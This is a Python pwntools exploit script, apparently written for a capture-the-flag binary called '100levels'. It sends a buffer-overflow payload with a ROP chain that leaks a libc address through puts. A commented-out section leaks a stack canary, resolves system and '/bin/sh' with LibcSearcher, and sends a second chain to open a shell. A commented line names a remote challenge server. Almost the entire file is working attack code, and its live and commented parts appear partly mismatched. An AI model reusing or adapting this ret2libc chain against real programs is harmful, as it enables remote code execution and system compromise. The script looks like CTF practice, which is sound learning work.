
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
# sh = process('./ret2libc164')
elf = ELF('./100levels')
readgot=elf.got['read']
putsplt=elf.plt['puts']
#ROPgadget - -binary 100levels - -only "pop|ret"
pop_rdi =0x0000000000001033
ret_addr = elf.symbols['__libc_start_main']
# main_addr = elf.symbols['main']
# main_addr =0x0000000000400908
# rdi = 0x0000000000400a93
# io = remote("111.200.241.244",52626)
io = process("./100levels")
gdb.attach(io)
# io.recv()
io.sendlineafter('Choice:\n', '1')
io.sendlineafter('How many levels?\n', '1')
io.sendlineafter('Any more?\n', '1')
io.recvuntil('Answer:')
payload = 'A'*0x30 + 'B'*8 + p64(pop_rdi) +p64(readgot) + p64(putsplt) + p64(ret_addr)
io.sendline(payload)
io.recv()
# info = io.recvline()
# log.info("info => %s", info)
#
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
# print('read_addr :',hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')
# log.info("system_addr => %#x", system_addr)
# log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
